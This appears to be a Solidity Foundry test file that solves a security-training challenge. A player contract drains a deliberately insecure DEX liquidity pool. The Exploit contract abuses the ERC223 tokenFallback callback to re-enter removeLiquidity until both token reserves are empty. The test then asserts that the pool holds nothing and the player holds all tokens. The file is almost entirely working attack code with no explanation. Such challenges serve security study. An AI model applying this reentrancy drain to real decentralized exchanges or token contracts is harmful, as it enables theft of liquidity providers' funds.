// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        
        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/    

        Exploit exploitContract = new Exploit(target, token0, token1);

        token0.transfer(address(exploitContract), 1 ether);
        token1.transfer(address(exploitContract), 1 ether);

        exploitContract.attackStart();

        exploitContract.withdraw();



        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/


contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    uint8 counter ;
    address public owner; 

    constructor(InsecureDexLP _dex, IERC20 _token0, IERC20 _token1) {

        dex = _dex;
        token0 = _token0;
        token1 = _token1;
        owner = msg.sender;

    }


    function attackStart() public {

        token0.approve(address(dex), 1 ether);
        token1.approve(address(dex), 1 ether);

        dex.addLiquidity(1 ether, 1 ether);
        console.log("Liquidity Balance of Exploting Contract :", dex.balanceOf(address(this)) );

        dex.removeLiquidity(1 ether);

    }

    function tokenFallback(address _dexAddr, uint256 _amount, bytes memory ) external {
        console.log("is it DEX addr ? : ", _dexAddr);
        
        if(token0.balanceOf(_dexAddr) > 0 && token1.balanceOf(_dexAddr) > 0) {
        counter++;
        console.log(" Call No : ", counter);
        console.log("token0 Balance of Exploting Contract :", token0.balanceOf(address(this)));
        console.log("token1 Balance of Exploting Contract :", token1.balanceOf(address(this)));
        dex.removeLiquidity(1 ether);
        } 
    }


    function withdraw() public {
        require(msg.sender == owner, "ONLY OWNER CAN WITHDRAW");
        uint256 balance0 = token0.balanceOf(address(this));
        uint256 balance1 = token1.balanceOf(address(this));


        token0.transfer(msg.sender, balance0 );
        token1.transfer(msg.sender, balance1 );
    }
 

}